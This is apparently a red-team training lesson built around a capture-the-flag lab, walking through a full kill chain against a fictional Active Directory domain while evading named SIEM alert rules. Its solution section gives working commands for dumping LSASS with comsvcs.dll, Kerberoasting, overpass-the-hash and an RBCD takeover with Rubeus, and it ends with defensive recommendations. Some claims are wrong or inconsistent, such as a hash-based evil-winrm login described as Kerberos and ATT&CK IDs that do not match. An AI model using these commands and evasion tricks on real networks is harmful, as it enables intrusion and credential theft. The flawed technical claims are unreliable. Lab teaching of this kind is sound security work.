---
title: "Red Team CTF Sprint — Day 9: Full Kill Chain Under Detection"
tags: [red-team, CTF, full-kill-chain, initial-access, phishing, C2, lateral-movement,
  domain-compromise, T1566.001, T1059.001, T1550.002, T1003.006, sprint, expert,
  challenge, capstone]
module: 08-RedTeam-03
day: 559
related_topics:
  - Red Team CTF Sprint Day 8 (Day 558)
  - Full Kill Chain Lab Day 1 (Day 506)
  - Full Kill Chain Lab Day 2 (Day 507)
  - Offshore Lab Episodes (Days 535–538)
  - Red Team Competency Check (Day 560)
---

# Day 559 — Red Team CTF Sprint: Day 9

> "A full kill chain is not the sum of its individual techniques. It is a
> story — and the story must be consistent. From the first spear-phish to
> the final DCSync, every action must flow from the last. Inconsistency is
> noise; noise is detection."
>
> — Ghost

---

## Goals

Execute a complete red team kill chain — from phishing to Domain Admin —
within a 5-hour window. The lab environment has Sysmon, a basic SIEM, and
an automated alert that fires when specific technique signatures are detected.
Complete the engagement without triggering more than two alerts.

**Prerequisites:** All Days 491–558. This is the penultimate sprint day
before the competency check. There are no new techniques here — this tests
whether you can chain everything cleanly under pressure.
**Time budget:** 5 hours hard stop.

---

## Challenge — Endgame

### Category
Red Team Operations (Full Kill Chain)

### Difficulty
Expert
Estimated time: 5 hours for a student at target level

### Learning Objective
Conduct a full red team engagement — phishing lure delivery, initial access,
C2 establishment, lateral movement, and domain compromise — while staying
below the detection threshold of a simulated SOC alert system. Document every
TTPs used and produce a one-page engagement summary on completion.

### Scenario

```
Target: Acme Manufacturing Ltd.
Environment: 3-host AD lab (DC01, WS01, WS02) + mail server (MAIL01)
Domain: ACMEMFG.LOCAL

Detection environment:
  - Sysmon 15 on all Windows hosts (SwiftOnSecurity config)
  - SIEM: Elastic SIEM ingesting all Sysmon + Windows Security events
  - Automated alert rules: 8 active rules (see Alert Manifest below)
  - Condition: >2 alerts triggered = lab reset, engagement failed

Your starting position:
  - External attacker with no credentials
  - MAIL01 (10.10.20.5) is reachable from your attack host
  - WS01 (10.10.10.20) and WS02 (10.10.10.30) are internal only
  - DC01 (10.10.10.10) is internal only

Objective: Retrieve the flag from C:\SecretDocuments\crown_jewels.txt on DC01.

Alert Manifest (8 active detection rules):
  A1: PowerShell encoded command execution (EventID 4104, ScriptBlockLogging)
  A2: Mimikatz keyword detection (EventID 4104, file name match)
  A3: msbuild.exe spawning a network connection (Sysmon EventID 3)
  A4: LSASS access from non-system process (Sysmon EventID 10, GrantedAccess 0x1010)
  A5: Pass-the-Hash from workstation (EventID 4624 LogonType 3, NTLM, from workstation)
  A6: DCSync from non-DC (EventID 4662, DS-Replication properties, non-DC source)
  A7: Suspicious scheduled task creation with encoded command (EventID 4698)
  A8: New local admin account creation (EventID 4720 + 4732)

Your constraints:
  - You must reach DC01 with admin rights
  - You may trigger at most 2 of the 8 alerts
  - 5-hour time limit
```

### Vulnerability / Technique

The environment has intentional vulnerabilities:
- WS01 has a user `alice` who opens all emails; password is crackable
- WS02 has a local admin with the same password as `alice`'s domain account
- The domain has no LAPS; local admin password is reused across all workstations
- DC01 has `svc-sql` with a Kerberoastable SPN and a weak password

### Hint Progression

1. A5 fires on NTLM PTH from a workstation. What authentication protocol
   avoids this? Kerberos overpass-the-hash (PTK) generates Kerberos tickets
   instead of NTLM tokens — does A5 catch that?
2. A4 fires on LSASS access with GrantedAccess 0x1010. What access mask does
   `comsvcs.dll MiniDump` use? Is it different from the alert's mask?
   Check the minimum access required for a minidump vs. Mimikatz.
3. A6 fires on DCSync from a non-DC IP. You need DA credentials without
   triggering DCSync. What alternative gives you a DA-equivalent credential
   without replication? (Hint: Golden Ticket requires only the KRBTGT hash —
   can you get that without DCSync if you already have DA?)

### Solution Walkthrough (One Valid Path)

```
Initial Access → WS01
────────────────────
- Phishing: craft a Word macro lure (macros disabled? → use a .lnk shortcut
  with a UNC path pointing to attack host — triggers NTLM auth)
- Alternative: HTML smuggling payload sent via GoPhish to alice@acmemfg.local
- alice opens the document → macro calls certutil.exe to download a stager
  (certutil is not in the alert manifest)
- Stager: PowerShell download cradle using Net.WebClient.DownloadString
  (A1 fires only on encoded commands — use cleartext inline PS)
- Beacon established: Sliver C2, WS01, context: ACMEMFG\alice

Lateral Movement → WS02
────────────────────────
- alice's NTLM hash extracted via comsvcs.dll MiniDump:
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid>
    C:\Windows\Temp\lsass.dmp full
  Access mask used: 0x1fffff (PROCESS_ALL_ACCESS)
  → A4 fires on 0x1010, not 0x1fffff → no alert

- Parse lsass.dmp offline with pypykatz:
  pypykatz lsa minidump C:\Windows\Temp\lsass.dmp
  → ACMEMFG\alice NTLM: abc123...

- Move to WS02 using Kerberos overpass-the-hash (avoids A5 NTLM check):
  Rubeus.exe asktgt /user:alice /rc4:abc123...
    /domain:acmemfg.local /ptt
  → TGT injected into current logon session (Kerberos, not NTLM)
  → evil-winrm -i 10.10.10.30 -u alice -H abc123...
    (uses Kerberos auth) → no A5 alert

Privilege Escalation on WS02
─────────────────────────────
- Local admin on WS02 (same password reuse)
- WS02 has svc-sql running → Kerberoast svc-sql:
  Rubeus.exe kerberoast /user:svc-sql /nowrap
  Crack offline: hashcat -m 13100 → Summer2024!

Domain Compromise
─────────────────
- svc-sql credentials → check BloodHound path from svc-sql
  svc-sql has GenericAll on DC01 computer object
  → RBCD attack (no DCSync needed):
    Rubeus.exe asktgt /user:svc-sql /password:Summer2024! /ptt
    Add msDS-AllowedToActOnBehalfOf: attack-controlled machine account
    Rubeus.exe s4u /user:attacker$ /rc4:<attacker_mach_hash>
      /impersonateuser:administrator /msdsspn:host/DC01 /ptt
  → TGS for administrator on DC01 injected → access C:\SecretDocuments\

- Collect flag:
  evil-winrm -i 10.10.10.10 -u administrator (Kerberos) → read flag
  → FLAG: CTF{full_kill_chain_under_alert_threshold}

Alerts triggered: 0 (if steps followed exactly)
```

### Flag
`CTF{full_kill_chain_under_alert_threshold}`

### Engagement Summary Template

```markdown
# Engagement Summary — Acme Manufacturing Ltd.

**Date:** ___________
**Duration:** ___________
**Outcome:** Domain compromise — flag retrieved

## Attack Path

| Stage               | Technique (ATT&CK)    | Tool              | Alert? |
|---------------------|-----------------------|-------------------|--------|
| Phishing / Delivery | T1566.001             | GoPhish / macro   |        |
| Initial Access      | T1059 / certutil      | certutil.exe      |        |
| Credential Access   | T1003.001 (comsvcs)   | rundll32.exe      |        |
| Lateral Movement    | T1550.003 (PTK/Kerb)  | Rubeus.exe        |        |
| Discovery           | T1018 (BloodHound)    | SharpHound        |        |
| Privilege Escalation| T1558.003 (Kerberoast)| Rubeus.exe        |        |
| Domain Compromise   | T1558 (RBCD S4U)      | Rubeus.exe        |        |
| Exfiltration        | T1005                 | evil-winrm        |        |

## Alerts Triggered

1. _____
2. _____

## Key Findings

1. LAPS not deployed — local admin password reuse across all workstations
2. svc-sql has a weak password and a Kerberoastable SPN
3. svc-sql has GenericAll on DC01 — enables RBCD without DCSync
4. Phishing simulation successful — alice opened attachment within 3 minutes

## Immediate Recommendations

1. Deploy LAPS across all workstations immediately
2. Rotate svc-sql to a gMSA (Group Managed Service Account)
3. Remove svc-sql GenericAll from DC01 computer object
4. Enable PowerShell Script Block Logging and AMSI integration
```

### Debrief Points

```
1. Alert avoidance requires reading the exact rule logic, not just the rule name.
   A4 fires on access mask 0x1010 — Mimikatz's default. comsvcs.dll uses a
   different mask. Understanding the detection's precision is the first step
   in evading it (and the first step in fixing it — use a mask-agnostic rule).

2. Overpass-the-hash (PTK) is Kerberos, not NTLM. A5 specifically watches
   for NTLM logon type 3. PTK produces a Kerberos TGT and never touches
   NTLM. Defenders who only alert on NTLM lateral movement miss this entirely.

3. RBCD does not require DCSync. It is a Kerberos-only attack path that produces
   a valid TGS for the target service. Defenders who only watch for DCSync as
   the domain compromise indicator miss RBCD, Golden Ticket (via
   previous KRBTGT exposure), and Silver Ticket paths.

4. The engagement summary is part of the deliverable. Red teamers who cannot
   explain what they did in plain English to a CISO are less valuable than
   red teamers who can. Every technique must map to a finding and a fix.

5. This challenge has multiple valid solution paths. The alert manifest is
   designed so that a student who reads it carefully can avoid every alert.
   A student who runs tooling without checking the manifest will trigger alerts.
   Ghost's Rule 4: know what your tools do before running them.
```

---

## Engagement Log — Day 9 Sprint

```
Time    | Action                                           | Result
--------|--------------------------------------------------|-------
        | Phishing payload delivered                       |
        | alice opened attachment — beacon received        |
        | LSASS dump via comsvcs.dll                       |
        | alice credentials extracted (pypykatz)           |
        | PTK to WS02                                      |
        | Kerberoasting of svc-sql                         |
        | svc-sql hash cracked                             |
        | BloodHound path: svc-sql→GenericAll→DC01         |
        | RBCD attack chain executed                       |
        | TGS for admin@DC01 obtained                      |
        | flag.txt retrieved                               |

Alerts triggered: _____ / 8
Flag captured: [ ] Yes  [ ] No
Total time: _____ minutes
Engagement summary written: [ ] Yes  [ ] No
```

---

## Key Takeaways

1. A red team engagement is not a list of techniques. It is a coherent story
   with consistent logic. Every step flows from the previous one. The best
   engagements read like a thriller; the worst read like a tool manual.
2. Alert avoidance requires precise knowledge of detection logic. "I used
   a different tool" is not a bypass plan. "The alert fires on access mask
   0x1010 and I used 0x1fffff" is a bypass plan — and also a detection
   improvement recommendation.
3. If you reached the flag without triggering any alerts: excellent. If you
   triggered alerts: read each one. Understand exactly what you did that
   caused it. Write the technique variation that would not trigger it.
   That gap is your homework before Day 560.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q559.1, Q559.2 …).

---

## Navigation

← Previous: [Day 558 — Red Team CTF Sprint: Day 8](DAY-0558-Red-Team-CTF-Sprint-Day-8.md)
→ Next: [Day 560 — Red Team Operations Competency Check](DAY-0560-Red-Team-Competency-Check.md)
